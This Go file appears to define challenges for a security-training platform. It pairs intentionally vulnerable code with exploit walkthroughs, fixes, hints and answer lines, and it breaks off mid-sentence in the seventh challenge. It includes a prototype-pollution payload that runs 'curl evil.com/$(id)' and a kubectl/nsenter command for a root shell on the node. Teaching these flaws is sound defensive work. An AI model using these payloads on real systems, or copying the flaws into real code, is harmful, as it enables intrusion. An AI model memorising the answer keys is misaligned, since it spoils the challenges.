package main

// OSCP-tier challenges. Each function returns a single challengeSeed.
// Add new ones to buildOSCPChallenges() and they automatically inherit the
// cmd/seed -verify deterministic line gate.
func buildOSCPChallenges() []challengeSeed {
	return []challengeSeed{
		oscpPHPTypeJuggling(),
		oscpPythonJWTKidPathTraversal(),
		oscpNodeServerSideProtoPollutionRCE(),
		oscpGoGRPCStreamAuthBypass(),
		oscpJavaSAMLXSWSigWrap(),
		oscpBashK8sPrivilegedPodEscape(),
		oscpPythonAWSConfusedDeputy(),
		oscpJavaHibernateHQLInjection(),
		oscpPythonXSLTInjectionRCE(),
		oscpRustUnsafeMemoryDisclosure(),
		oscpGoHTTPSmugglingViaBufio(),
		oscpNodePostMessageOriginBypass(),
		oscpNodeGraphQLAliasDoS(),
		oscpPythonSSRFDNSRebinding(),
	}
}

// ──────────────────────────────────────────────────
// OSCP 1 — PHP loose-comparison auth bypass via magic hash
// Difficulty 4 — Classic but still seen in legacy PHP codebases.
// ──────────────────────────────────────────────────
func oscpPHPTypeJuggling() challengeSeed {
	return challengeSeed{
		title:        "The Magic Number — PHP Type Juggling Auth Bypass",
		slug:         "php-type-juggling-magic-hash-auth-bypass",
		difficulty:   4,
		langSlug:     "php",
		catSlug:      "auth-bypass",
		points:       250,
		cveReference: "CWE-697 (incorrect comparison)",
		description: `A legacy PHP login endpoint authenticates internal staff for a
financial-services back office. The current developer inherited it from a
contractor 5 years ago. Hashing was modernized to MD5 (the original was
plaintext) but the comparison logic was not touched.

The hash table contains 1,200+ staff records, including the central
"sysadmin" account that bootstraps the rest of the platform.

Find the vulnerability that allows an attacker who knows ANY single
username (which is enumerable through the password-reset endpoint) to
log in as that user without knowing the password.`,
		code: `<?php
require_once 'db.php';
require_once 'session.php';

header('Content-Type: application/json');

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

if (empty($username) || empty($password)) {
    http_response_code(400);
    echo json_encode(['error' => 'Missing credentials']);
    exit;
}

$user = db_query_one(
    'SELECT id, username, password_hash, role FROM users WHERE username = ?',
    [$username]
);

if (!$user) {
    http_response_code(401);
    echo json_encode(['error' => 'Invalid credentials']);
    exit;
}

$submitted_hash = md5($password);

if ($submitted_hash == $user['password_hash']) {
    session_start_for_user($user);
    echo json_encode([
        'status' => 'authenticated',
        'role'   => $user['role']
    ]);
} else {
    http_response_code(401);
    echo json_encode(['error' => 'Invalid credentials']);
}
?>`,
		targetVuln: `PHP loose-comparison (type juggling) authentication bypass via the
"magic hash" class of attack.

Two issues compound:

1. The password is hashed with MD5, which is known to admit "magic hash"
preimages: short strings whose MD5 happens to be of the form 0e + 30 digits
(e.g. "240610708" → MD5 "0e462097431906509019562988736854"). A handful of
these magic strings have been publicly indexed for years.

2. The comparison on the hash uses == (loose equality), not === (strict).
When PHP's loose comparison encounters two strings that both look like
"0e…" decimal-only payloads, it coerces them to floats — both become 0.0,
and 0.0 == 0.0 is true. So any stored password whose MD5 happens to be a
magic-hash string can be matched by submitting ANY magic-hash preimage.

About 0.1% of randomly chosen passwords have MD5s of this form. Across
1,200 staff accounts, statistically at least one will be exploitable.
Worse, the contractor seeded admin accounts with common passwords; if any
of those happen to MD5-hash to a magic value, the attacker logs in as
admin with no credentials at all.

The vulnerable line is the == comparison. The MD5 choice contributes
to exploitability because no public magic-hash preimages exist for
cryptographically modern hashes (bcrypt, argon2id, scrypt).`,
		conceptualFix: `Two independent fixes, both required:

1. Replace == with hash_equals():
       if (hash_equals($user['password_hash'], $submitted_hash)) { ... }
   hash_equals performs a constant-time string comparison and never
   coerces operand types. (=== would also fix the type-juggling but is
   not constant-time; for password use cases hash_equals is the right
   primitive.)

2. Stop using MD5 for passwords. Use password_hash() / password_verify()
   with PASSWORD_BCRYPT or PASSWORD_ARGON2ID:
       if (password_verify($password, $user['password_hash'])) { ... }
   password_verify performs a constant-time, type-safe comparison and
   makes magic-hash preimage attacks computationally infeasible.

Defense in depth: rate-limit failed login attempts per username and per
source IP, log magic-hash-shaped submissions as suspicious activity, and
plan a forced password-rotation for all staff to migrate off MD5 hashes.`,
		hints: []string{
			"What's the difference between == and === in PHP, especially when both operands are strings that look like numbers?",
			"Search for 'PHP magic hash' — the term refers to short passwords whose MD5 happens to start with '0e' followed by only digits.",
			"What does PHP do with the string '0e123' in a numeric context?",
		},
		vulnerableLines: []int{27, 29},
	}
}

// ──────────────────────────────────────────────────
// OSCP 2 — JWT `kid` header path traversal + algorithm confusion
// Difficulty 7 — Two bugs that chain into full authentication bypass.
// ──────────────────────────────────────────────────
func oscpPythonJWTKidPathTraversal() challengeSeed {
	return challengeSeed{
		title:        "The Phantom Key — JWT `kid` Header Path Traversal",
		slug:         "python-jwt-kid-header-path-traversal",
		difficulty:   7,
		langSlug:     "python",
		catSlug:      "auth-bypass",
		points:       500,
		cveReference: "CWE-22 + CWE-327 (path traversal chained with algorithm confusion)",
		description: `A Python/Flask API gateway protects a private banking dashboard with
RS256-signed JWTs issued by an upstream identity provider. To support
seamless key rotation the gateway loads the public key for each token
by its key ID (the "kid" header field), reading the corresponding PEM
file from /etc/auth/keys/.

This pattern has been in production for two years. Recently the team
added HS256 to the allowed-algorithms list "for service-to-service
tokens" without changing the key-resolution logic.

Find the vulnerability chain that lets an attacker forge a token for
any user — including the dashboard's break-glass "root" account — using
only files already readable by the gateway process.`,
		code: `import os
import jwt
from flask import Flask, request, jsonify

app = Flask(__name__)

KEYS_DIR = "/etc/auth/keys"

def load_public_key(kid: str) -> bytes:
    key_path = os.path.join(KEYS_DIR, f"{kid}.pem")
    with open(key_path, "rb") as f:
        return f.read()

@app.route("/api/dashboard", methods=["GET"])
def dashboard():
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return jsonify({"error": "Missing token"}), 401
    token = auth[len("Bearer "):]

    try:
        headers = jwt.get_unverified_header(token)
        kid = headers.get("kid")
        if not kid:
            return jsonify({"error": "Missing kid header"}), 400

        public_key = load_public_key(kid)

        claims = jwt.decode(
            token,
            public_key,
            algorithms=["RS256", "HS256"],
            options={"verify_aud": False}
        )
        return jsonify({"status": "ok", "user": claims.get("sub")})
    except jwt.InvalidTokenError as e:
        return jsonify({"error": str(e)}), 401

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)`,
		targetVuln: `Two vulnerabilities chain into a full authentication bypass:

1. PATH TRAVERSAL via the kid header (line 10).
   The kid value from the (unverified) JWT header is concatenated directly
   into a filesystem path via os.path.join. Because os.path.join discards
   earlier components when a later one starts with "/", and accepts ".."
   without normalization, an attacker can set
       kid = "../../../proc/self/environ"
       kid = "../../../etc/passwd"
       kid = "/etc/ssl/certs/ca-certificates.crt"
   and have the gateway read arbitrary files as the JWT "public key".

2. ALGORITHM CONFUSION (line 32).
   The decode call allows BOTH "RS256" and "HS256". jwt.decode trusts the
   alg field in the JWT header to pick which algorithm to apply. When alg
   is "HS256", the second argument (intended as an RSA public key) is
   instead used as the HMAC secret.

Chained exploit:
  (a) Attacker forges a JWT with alg=HS256, kid=../../../etc/issue (or any
      file with predictable, readable contents).
  (b) Attacker computes HMAC-SHA256 over the JWT header+payload using the
      contents of that file as the HMAC secret.
  (c) Attacker submits the forged token. The gateway:
       - parses kid, reads /etc/issue,
       - sees alg=HS256, runs HMAC verification using /etc/issue's bytes
         as the secret,
       - verification passes because the attacker used the same bytes,
       - claims.sub is whatever the attacker put there (e.g. "root").

The vulnerability would still exist with just HS256 alone (algorithm
confusion is the keystone), or with just path traversal alone (an
attacker who can plant a .pem file under KEYS_DIR could sign tokens).
Together they require no privileges at all — the attacker only needs
a predictable, readable file on the host.`,
		conceptualFix: `Fix BOTH bugs; either one alone leaves significant residual risk.

1. Treat the kid as opaque and validate it against an allowlist BEFORE
touching the filesystem:
       VALID_KIDS = {"2024-01", "2024-04", "2024-10"}
       if kid not in VALID_KIDS:
           raise InvalidTokenError("unknown kid")
   Reject anything containing "/", "..", or null bytes. Even better:
   resolve the absolute path with os.path.realpath() and assert it is
   still under KEYS_DIR.

2. Pin the algorithm. Never allow both asymmetric AND symmetric algs in
the same decode() call. For an RS256 identity provider use:
       claims = jwt.decode(token, public_key, algorithms=["RS256"])
   If service-to-service tokens really do need HS256, route them through
   a SEPARATE endpoint with its own decode call and its own secret.

3. Defense in depth:
   - Pull keys from an in-memory JWKS document refreshed on a schedule,
     not from arbitrary filesystem paths.
   - Add aud / iss claim validation (verify_aud should not be disabled).
   - Log decode-with-suspicious-kid events.

4. If migration is hard, use a kid-to-path mapping table:
       KID_TO_PATH = {"2024-01": "/etc/auth/keys/2024-01.pem", ...}
   so the attacker controls only the lookup key, never the path.`,
		hints: []string{
			"What does os.path.join do when one of its components starts with '/' or contains '..'?",
			"jwt.decode trusts the alg header to pick the verification algorithm. What happens if alg=HS256 but the second argument is a public key file?",
			"Find a predictable, readable file on a typical Linux host. Could you use its contents as an HMAC secret?",
		},
		vulnerableLines: []int{10, 32},
	}
}

// ──────────────────────────────────────────────────
// OSCP 3 — Server-side prototype pollution → RCE via lodash.template gadget
// Difficulty 9 — Two-stage attack: pollute Object.prototype, then trigger
// the template-compilation gadget that turns options into executed JS.
// ──────────────────────────────────────────────────
func oscpNodeServerSideProtoPollutionRCE() challengeSeed {
	return challengeSeed{
		title:        "The Polluted Prototype — Server-Side __proto__ → RCE",
		slug:         "nodejs-server-side-proto-pollution-template-rce",
		difficulty:   9,
		langSlug:     "nodejs",
		catSlug:      "prototype-pollution",
		points:       700,
		cveReference: "CVE-2019-10744-class chain (lodash <4.17.12 + naive deep-merge)",
		description: `A Node.js microservice for a digital-marketing platform exposes a
user-preference endpoint that deep-merges JSON request bodies into a
per-user preferences object. The service also exposes a banner-rendering
endpoint that uses lodash.template (locked at 4.17.10 because "upgrading
broke the build").

Both endpoints are reachable from the public web behind a JWT-checking
load balancer. The auth layer prevents tampering with OTHER users'
prefs, but an attacker only needs to mutate their OWN preferences to
escalate.

Find the chain that turns a benign-looking preferences POST into remote
code execution in the Node process.`,
		code: `const express = require('express');
const lodash = require('lodash');

const app = express();
app.use(express.json());

const userPrefs = new Map();

function deepAssign(target, source) {
    for (const key of Object.keys(source)) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (typeof target[key] !== 'object' || target[key] === null) {
                target[key] = {};
            }
            deepAssign(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

app.post('/api/prefs/:userId', (req, res) => {
    const userId = req.params.userId;
    if (!userPrefs.has(userId)) {
        userPrefs.set(userId, { theme: 'light', notifications: true });
    }
    const current = userPrefs.get(userId);
    const updated = deepAssign(current, req.body);
    res.json({ status: 'ok', prefs: updated });
});

app.get('/api/banner', (req, res) => {
    const compiled = lodash.template('Hello, <%= name %>!');
    res.send(compiled({ name: 'guest' }));
});

app.listen(3000);`,
		targetVuln: `A two-stage server-side prototype pollution → RCE chain.

STAGE 1 — Prototype pollution via deepAssign (lines 10, 15).
The deepAssign function iterates Object.keys(source) and recurses into
nested objects. When req.body comes from express.json(), JSON.parse
specially preserves "__proto__" as an own property on the resulting
object. Object.keys therefore returns ["__proto__", …], and the
recursion target[key] = target["__proto__"] resolves through the
prototype-setter, giving the next recursion call a target of
Object.prototype itself. Any leaf assignment from then on writes to
Object.prototype.

Attacker payload:
    POST /api/prefs/anything
    Content-Type: application/json
    {"__proto__": {"sourceURL": "\\n);process.mainModule.require('child_process').exec('curl evil.com/$(id)');//"}}

After this request, Object.prototype.sourceURL is set to the gadget
string and EVERY object in the process now sees that property by
inheritance.

STAGE 2 — The lodash.template gadget (line 35).
lodash.template internally constructs its compiled function source via
string concatenation that includes options.sourceURL — used as a
//# sourceURL=... debugger directive. In lodash <= 4.17.10, the source
of those options falls back through ({} as a default), so an inherited
sourceURL on Object.prototype is included in the compiled function
body. The compiled body is then passed to new Function(...) → arbitrary
JS executed inside the Node process.

Net effect: a single POST that the auth layer treats as "the user is
modifying their own prefs" leads to RCE the next time anyone hits the
banner endpoint. Because Object.prototype is process-global, the
pollution survives across requests until the Node process restarts.`,
		conceptualFix: `Multiple independent fixes; apply at least the first two.

1. Filter dangerous keys in deepAssign:
       const FORBIDDEN = new Set(['__proto__', 'constructor', 'prototype']);
       for (const key of Object.keys(source)) {
           if (FORBIDDEN.has(key)) continue;
           ...
       }
   Equivalently, switch to Object.create(null) for target maps so they
   have no prototype to pollute.

2. Use a well-maintained merge library that explicitly defends against
   prototype pollution (lodash.merge >= 4.17.12, deepmerge, etc.). Pin
   versions and run npm audit in CI.

3. Validate request bodies against a strict schema (JSON Schema, zod,
   ajv) BEFORE merging. Schemas reject unknown keys and structurally
   prevent __proto__ from appearing in user input.

4. Avoid lodash.template entirely. Use a sandboxed templating engine
   that does not compile to new Function() (mustache, eta in strict
   mode, etc.). If lodash.template is unavoidable, upgrade to
   >= 4.17.15 which guards options against polluted prototypes.

5. Defense in depth: run the Node process with --disallow-code-generation-from-strings
   to break the new Function() gadget at runtime even if pollution
   succeeds (note this also disables Function() and eval()).`,
		hints: []string{
			"What does JSON.parse do when it sees a key named '__proto__'? Is it treated as an own property, or as a setter?",
			"Trace what happens when deepAssign recurses on key='__proto__'. What object does target[key] resolve to?",
			"Read the lodash.template source for how it builds its compiled function. Where does the sourceURL option come from?",
		},
		vulnerableLines: []int{10, 15, 34},
	}
}

// ──────────────────────────────────────────────────
// OSCP 4 — gRPC streaming-RPC auth bypass via missing StreamInterceptor
// Difficulty 7 — Common in services migrated from unary-only to streaming
// without revisiting the interceptor configuration.
// ──────────────────────────────────────────────────
func oscpGoGRPCStreamAuthBypass() challengeSeed {
	return challengeSeed{
		title:        "Trusted Metadata — gRPC Stream-RPC Auth Bypass",
		slug:         "go-grpc-stream-interceptor-missing-auth-bypass",
		difficulty:   7,
		langSlug:     "go",
		catSlug:      "broken-access",
		points:       500,
		cveReference: "CWE-862 (missing authorization on streaming endpoints)",
		description: `A Go gRPC service powers the real-time account-events feed for a
fintech app. The original developer wrote a careful unary interceptor
that validates the Bearer token in the incoming metadata, but later
added a streaming Subscribe RPC for the new mobile push feature.

The service has been in production for 11 months. The auth interceptor
shows up in every unary path's audit log so the team assumed it covered
the streaming path too. Today an internal red-team exercise found that
streaming AccountEvents leak across users without authentication.

Find the configuration gap, then explain why the Subscribe handler
itself is also at fault.`,
		code: `package authsvc

import (
	"context"
	"strings"

	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/status"
)

type authKey struct{}

// UnaryAuthInterceptor enforces bearer-token auth for unary RPCs.
func UnaryAuthInterceptor(
	ctx context.Context,
	req any,
	info *grpc.UnaryServerInfo,
	handler grpc.UnaryHandler,
) (any, error) {
	user, err := authenticate(ctx)
	if err != nil {
		return nil, err
	}
	return handler(context.WithValue(ctx, authKey{}, user), req)
}

func authenticate(ctx context.Context) (string, error) {
	md, ok := metadata.FromIncomingContext(ctx)
	if !ok {
		return "", status.Error(codes.Unauthenticated, "missing metadata")
	}
	tokens := md.Get("authorization")
	if len(tokens) == 0 {
		return "", status.Error(codes.Unauthenticated, "missing authorization")
	}
	if !strings.HasPrefix(tokens[0], "Bearer ") {
		return "", status.Error(codes.Unauthenticated, "invalid scheme")
	}
	user, err := verifyJWT(tokens[0][len("Bearer "):])
	if err != nil {
		return "", status.Error(codes.Unauthenticated, "invalid token")
	}
	return user, nil
}

func NewServer() *grpc.Server {
	return grpc.NewServer(
		grpc.UnaryInterceptor(UnaryAuthInterceptor),
	)
}

// AccountStreamingServer handles bi-directional account-event streams.
type AccountStreamingServer struct {
	UnimplementedAccountStreamingServer
	broker *eventBroker
}

func (s *AccountStreamingServer) Subscribe(
	req *SubscribeRequest,
	stream AccountStreaming_SubscribeServer,
) error {
	for event := range s.broker.subscribe(req.AccountId) {
		if err := stream.Send(&AccountEvent{
			AccountId:    req.AccountId,
			EventType:    event.Type,
			BalanceCents: event.BalanceCents,
			Timestamp:    event.Timestamp,
		}); err != nil {
			return err
		}
	}
	return nil
}

func verifyJWT(token string) (string, error) {
	return parseAndValidate(token)
}`,
		targetVuln: `Two compounding flaws:

1. INTERCEPTOR ASYMMETRY (line 51).
   NewServer registers only grpc.UnaryInterceptor(UnaryAuthInterceptor).
   grpc-go has SEPARATE interceptor chains for unary and streaming RPCs
   — registering one does not register the other. The Subscribe RPC is
   a server-streaming method, so it bypasses UnaryAuthInterceptor
   entirely. Without a companion grpc.StreamInterceptor, every streaming
   RPC reaches its handler with NO authentication check.

2. NO IN-HANDLER AUTH (line 64).
   The Subscribe handler reads req.AccountId straight from the request
   and subscribes to that account's event stream. There is no check
   that the caller is allowed to read THIS account's events. Even if
   the streaming interceptor existed, the handler would still trust
   req.AccountId blindly — a logged-in user "alice" could request
   bob's events.

Exploit:
   Any anonymous TCP client (or curl-grpc) can dial the service, open
   the Subscribe stream, and pass any account_id they like. The broker
   happily ships every event for that account, including transaction
   amounts and balance updates — to a caller with no credentials at all.

This pattern is endemic in services that started life as unary-only and
added streaming as a feature. The auth interceptor was correct on day
one; the regression came in silently when the streaming method was
added.`,
		conceptualFix: `Three fixes; the first two are mandatory.

1. Register a StreamInterceptor alongside the unary one. The auth
logic factors out; just wrap it:

    func StreamAuthInterceptor(
        srv any,
        ss grpc.ServerStream,
        info *grpc.StreamServerInfo,
        handler grpc.StreamHandler,
    ) error {
        user, err := authenticate(ss.Context())
        if err != nil {
            return err
        }
        wrapped := &authedStream{ServerStream: ss, user: user}
        return handler(srv, wrapped)
    }

    func NewServer() *grpc.Server {
        return grpc.NewServer(
            grpc.UnaryInterceptor(UnaryAuthInterceptor),
            grpc.StreamInterceptor(StreamAuthInterceptor),
        )
    }

   Use a wrapped ServerStream so the handler can pull the authenticated
   user via ss.Context().Value(authKey{}).

2. Enforce per-resource authorization inside the handler. Authentication
proves WHO the caller is; authorization proves they're allowed to read
THIS account.

    user := stream.Context().Value(authKey{}).(string)
    if !accountAccessControl.CanRead(user, req.AccountId) {
        return status.Error(codes.PermissionDenied, "forbidden")
    }

3. Defense in depth:
   - Use go-grpc-middleware to compose ratelimit + auth + logging
     interceptors uniformly across unary and stream.
   - Add an integration test that asserts UNAUTHENTICATED is returned
     for both unary AND streaming calls with a missing/invalid token.
   - Audit-log every Subscribe call with the authenticated subject and
     the requested account_id — internal red-teams can spot leakage
     fast.`,
		hints: []string{
			"In grpc-go, what's the relationship between grpc.UnaryInterceptor and grpc.StreamInterceptor? Does one imply the other?",
			"Trace a Subscribe RPC from the client to the handler. Which interceptor chain does it pass through?",
			"Even if the interceptor ran, the Subscribe method itself takes req.AccountId at face value. Is there an authorization check inside the handler body?",
		},
		vulnerableLines: []int{50, 64},
	}
}

// ──────────────────────────────────────────────────
// OSCP 5 — SAML XML Signature Wrapping (XSW)
// Difficulty 9 — Validator decouples signature scope from attribute scope.
// ──────────────────────────────────────────────────
func oscpJavaSAMLXSWSigWrap() challengeSeed {
	return challengeSeed{
		title:        "Signature Sleight — SAML XML Signature Wrapping",
		slug:         "java-saml-xsw-signature-wrapping",
		difficulty:   9,
		langSlug:     "java",
		catSlug:      "auth-bypass",
		points:       700,
		cveReference: "CWE-347 / well-known SAML XSW attack class",
		description: `A Java enterprise SSO gateway accepts SAML 2.0 Responses from a
trusted upstream identity provider. The gateway validates the XML
digital signature on each response, then extracts the Subject NameID
and Role attribute to authorize the user against the application's
RBAC layer.

The pattern has been in production for three years. A recent SSO red
team engagement reported that the gateway lets any holder of a
legitimate signed response forge an "admin" session — without
breaking the signature.

Find the assumption baked into the validator that lets the signature
check pass while the attribute extraction reads attacker-controlled
data.`,
		code: `package com.example.saml;

import java.io.ByteArrayInputStream;
import java.security.PublicKey;
import java.util.Optional;
import javax.xml.crypto.dsig.XMLSignatureFactory;
import javax.xml.crypto.dsig.dom.DOMValidateContext;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;

public class SAMLAssertionValidator {

    private static final String DS_NS   = "http://www.w3.org/2000/09/xmldsig#";
    private static final String SAML_NS = "urn:oasis:names:tc:SAML:2.0:assertion";

    private final PublicKey idpPublicKey;

    public SAMLAssertionValidator(PublicKey idpPublicKey) {
        this.idpPublicKey = idpPublicKey;
    }

    public Optional<Principal> validate(String responseXml) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setNamespaceAware(true);
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(
            new ByteArrayInputStream(responseXml.getBytes("UTF-8")));

        NodeList sigs = doc.getElementsByTagNameNS(DS_NS, "Signature");
        if (sigs.getLength() == 0) {
            return Optional.empty();
        }
        DOMValidateContext ctx = new DOMValidateContext(idpPublicKey, sigs.item(0));
        XMLSignatureFactory fac = XMLSignatureFactory.getInstance("DOM");
        if (!fac.unmarshalXMLSignature(ctx).validate(ctx)) {
            return Optional.empty();
        }

        NodeList assertions = doc.getElementsByTagNameNS(SAML_NS, "Assertion");
        if (assertions.getLength() == 0) {
            return Optional.empty();
        }
        Element assertion = (Element) assertions.item(0);
        return Optional.of(parsePrincipal(assertion));
    }

    private Principal parsePrincipal(Element assertion) {
        NodeList names = assertion.getElementsByTagNameNS(SAML_NS, "NameID");
        String subject = names.item(0).getTextContent();
        String role = assertion.getAttribute("Role");
        return new Principal(subject, role);
    }
}`,
		targetVuln: `Classic XML Signature Wrapping (XSW) — the validator never
establishes that the signed XML region is the SAME region from which
it extracts the user's identity.

Step 1 finds the first <ds:Signature> in the document by tag name and
verifies it cryptographically. This passes against a legitimately-signed
inner assertion that the attacker copied verbatim from a real response.

Step 2 finds the first <saml:Assertion> in the document by tag name
and reads NameID + Role from it. This is a SEPARATE DOM lookup; it does
NOT walk down from the signed element or check that the assertion it
returns is a descendant of (or is) the signed scope.

Attack payload (XSW-style outline):

  <samlp:Response>
    <saml:Assertion Role="admin">              <!-- attacker, FIRST -->
      <saml:Subject>
        <saml:NameID>victim@example.com</saml:NameID>
      </saml:Subject>
    </saml:Assertion>
    <saml:Assertion Role="user">               <!-- legit, signed -->
      <ds:Signature>...valid signature over THIS assertion...</ds:Signature>
      <saml:Subject><saml:NameID>victim@example.com</saml:NameID></saml:Subject>
    </saml:Assertion>
  </samlp:Response>

When validate() runs:
  - sigs.item(0) finds the inner ds:Signature → cryptographic check
    succeeds (the referenced element is intact).
  - assertions.item(0) returns the FIRST <Assertion> in document order
    — the attacker's wrapper with Role="admin".
  - parsePrincipal reads Role="admin" off the attacker's assertion.

The gateway hands the application a Principal("victim@example.com",
"admin") and the RBAC layer happily admits the request. No private key
compromise, no signature forgery — just a single replayed wrapper
around the attacker's payload.`,
		conceptualFix: `Anchor attribute extraction to the signed element, not to a global
DOM lookup.

1. Use the Reference URI from the signature to locate the signed
   element, then read attributes only from THAT element:

       XMLSignature sig = fac.unmarshalXMLSignature(ctx);
       if (!sig.validate(ctx)) return Optional.empty();

       String refURI = sig.getSignedInfo().getReferences()
                          .get(0).getURI();   // "#assertion-id-..."
       Element signed = doc.getElementById(refURI.substring(1));
       if (signed == null) return Optional.empty();
       return Optional.of(parsePrincipal(signed));

2. Mark the SAML id attributes as XML ID via Schema/DTD so
   getElementById() works. Without an explicit ID schema, attribute
   IDs are ignored and the lookup silently returns null — many SAML
   libraries get this wrong.

3. Defense in depth:
   - Reject responses with more than one <Assertion>.
   - Reject responses where the signed element is not the document
     root assertion (a stricter policy than the bare standard).
   - Use a hardened SAML library (OpenSAML, Spring Security SAML,
     Keycloak SAML adapter) that handles XSW1-8 correctly.
   - Add structural checks: assertion must be an immediate child of
     the Response, signature must be an immediate child of the
     assertion it covers.

4. Long-term: migrate to OIDC where signature scope is the entire
   JWT and the signed region is the parsed region — no XML
   wrapping ambiguity.`,
		hints: []string{
			"Search for 'SAML XSW' or 'XML Signature Wrapping'. What's the relationship between the signed element and the element the parser actually reads?",
			"The validator calls getElementsByTagNameNS twice — once for Signature and once for Assertion. Does it check that they belong to the same subtree?",
			"What happens if you take a legitimately signed assertion and ADD another assertion as the first child of <samlp:Response>?",
		},
		vulnerableLines: []int{32, 42},
	}
}

// ──────────────────────────────────────────────────
// OSCP 6 — Kubernetes privileged-pod escape via deploy-pipeline RBAC
// Difficulty 8 — RBAC + pod-security combo that gives any holder of
// the deploy service-account token root on every node.
// ──────────────────────────────────────────────────
func oscpBashK8sPrivilegedPodEscape() challengeSeed {
	return challengeSeed{
		title:        "Trojan Migration — K8s Privileged-Pod Cluster Escape",
		slug:         "bash-k8s-privileged-pod-escape",
		difficulty:   8,
		langSlug:     "bash",
		catSlug:      "broken-access",
		points:       600,
		cveReference: "CWE-269 / canonical K8s privesc pattern",
		description: `A SaaS team ships its application via a GitOps pipeline. The CI
runner authenticates to the production cluster with a ServiceAccount
token (deploy-sa) and applies the manifests below. The deploy-sa token
also lives in the runner's Vault and is mounted into every CI job.

Any contributor with PR-merge permission on the infrastructure repo
can submit Helm values that change the migration job's image. The team
considered that risk and decided "it's fine — the job only runs in the
app-prod namespace."

Identify the chain of misconfigurations that turns "PR merge in
infra-repo" into "root on every Kubernetes worker node."`,
		code: `apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: app-prod
  name: deploy-pod-creator
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["create", "get", "list", "watch", "delete"]
- apiGroups: [""]
  resources: ["pods/exec"]
  verbs: ["create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  namespace: app-prod
  name: deploy-can-create-pods
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: deploy-pod-creator
subjects:
- kind: ServiceAccount
  name: deploy-sa
  namespace: app-prod
---
apiVersion: batch/v1
kind: Job
metadata:
  name: db-migration-job
  namespace: app-prod
spec:
  template:
    spec:
      serviceAccountName: deploy-sa
      containers:
      - name: migrate
        image: app-org/migrate:latest
        command: ["/app/migrate", "up"]
        securityContext:
          privileged: true
          runAsUser: 0
        volumeMounts:
        - name: host-root
          mountPath: /host
      volumes:
      - name: host-root
        hostPath:
          path: /
          type: Directory
      restartPolicy: Never`,
		targetVuln: `Three independent misconfigurations chain into a full node escape.
None is exploitable alone; together they collapse the cluster's
isolation boundary.

1. RBAC: pods/exec verb (line 11).
   The deploy-sa Role grants "create" on the "pods/exec" subresource.
   This is the verb that backs "kubectl exec -ti <pod> -- /bin/sh".
   With this verb plus "create" on pods, any holder of the token can
   start a new pod AND then drop a shell inside it.

2. Pod SecurityContext: privileged + UID 0 (line 43).
   "privileged: true" disables the container runtime's seccomp,
   AppArmor, and capability filters. The container runs with all
   Linux capabilities, can mount block devices, and can issue
   syscalls that touch the kernel directly.

3. Volume: hostPath / mounted at /host (line 51).
   hostPath: "/" mounts the worker node's root filesystem into the
   container. Combined with privileged=true, the container can:
     - chroot /host /bin/sh   — fully escape into the host namespace
     - read /host/etc/shadow, /host/root/.ssh/authorized_keys
     - read /host/var/lib/kubelet/pods/.../kube-api-access-*/token
       — the kubelet's bootstrap creds OR any other pod's SA token
     - write /host/var/lib/kubelet to persist
     - access /host/var/run/docker.sock or containerd's sock

Exploit:
  Attacker merges a PR that swaps the migrate image to a benign-
  looking shim. When the CI pipeline applies it, the Job runs the
  shim, which sleeps. The attacker, using the deploy-sa token leaked
  from the CI runner, runs:

      kubectl exec -ti db-migration-job-xyz -- nsenter --target 1
                                                       --mount --uts
                                                       --ipc --net
                                                       --pid -- /bin/bash

  And now has a root shell in the worker node's PID 1 namespace. From
  there: dump every other pod's tokens, pivot to the API server,
  exfiltrate all secrets in the cluster.`,
		conceptualFix: `Apply at every layer of the chain.

1. Remove pods/exec from deploy-sa.
   Migration jobs run themselves; the deploy service account never
   needs to drop interactive shells. If exec is needed for debugging,
   create a SEPARATE role bound only to specific human accounts and
   only in a separate troubleshooting namespace.

2. Drop privileged + runAsUser:0 + hostPath.
   The migration job is a CLI talking to PostgreSQL — it needs no
   host access and no root.

       securityContext:
         allowPrivilegeEscalation: false
         readOnlyRootFilesystem: true
         runAsNonRoot: true
         runAsUser: 1000
         capabilities:
           drop: ["ALL"]
       # remove the host-root volume entirely

3. Enforce at the cluster level. Even if a manifest tries to
   reintroduce the misconfig, the cluster should refuse it:

   - Pod Security Admission "restricted" profile on app-prod:
       kubectl label namespace app-prod \
         pod-security.kubernetes.io/enforce=restricted
   - OR a Kyverno / OPA Gatekeeper policy that denies privileged,
     denies hostPath, denies runAsUser=0.

4. Tighten the CI trust model. The deploy-sa token should be
   short-lived (use BoundServiceAccountTokenVolume + projected
   tokens with audience binding), and the CI runner should pull
   the token at job start with a workload-identity exchange — never
   long-lived in Vault.

5. Audit: alert on any new pod with privileged=true, hostPath, or
   capabilities.add that includes SYS_ADMIN.`,
		hints: []string{
			"Look at every key under securityContext. Which of them disable container isolation?",
			"What does the pods/exec RBAC verb let you do once you can also create pods?",
			"Trace what /host would contain if it were mounted from path: '/'. What files could a root-uid privileged container read or write through it?",
		},
		vulnerableLines: []int{11, 42, 50},
	}
}

// ──────────────────────────────────────────────────
// OSCP 7 — AWS confused-deputy via caller-controlled S3 bucket name
// Difficulty 8 — IAM role's permissions exceed the per-request authz.
// ──────────────────────────────────────────────────
func oscpPythonAWSConfusedDeputy() challengeSeed {
	return challengeSeed{
		title:        "The Borrowed Badge — AWS S3 Confused Deputy",
		slug:         "python-aws-s3-confused-deputy",
		difficulty:   8,
		langSlug:     "python",
		catSlug:      "broken-access",
		points:       600,
		cveReference: "CWE-441 (confused deputy)",
		description: `A multi-tenant SaaS exposes a thumbnail-preview endpoint. The Python
worker process runs on EC2 with an instance profile granting
s3:GetObject on tenant-specific upload buckets AND on a separate set
of cross-tenant "shared internal reports" buckets the platform team
